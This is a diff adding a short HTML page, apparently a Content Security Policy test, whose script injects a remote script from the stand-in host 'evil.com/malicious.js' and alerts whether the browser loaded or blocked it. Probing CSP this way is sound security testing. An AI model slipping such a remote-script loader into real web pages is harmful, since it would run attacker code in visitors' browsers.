@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSP Bypass Test</title>
+</head>
+<body>
+    <h1>CSP Bypass Test</h1>
+    <script>
+        const script = document.createElement('script');
+        script.src = 'https://evil.com/malicious.js';
+        document.head.appendChild(script);
+        script.onload = () => alert('CSP Bypass: Script Loaded!');
+        script.onerror = () => alert('CSP Blocked.');
+    </script>
+</body>
+</html>
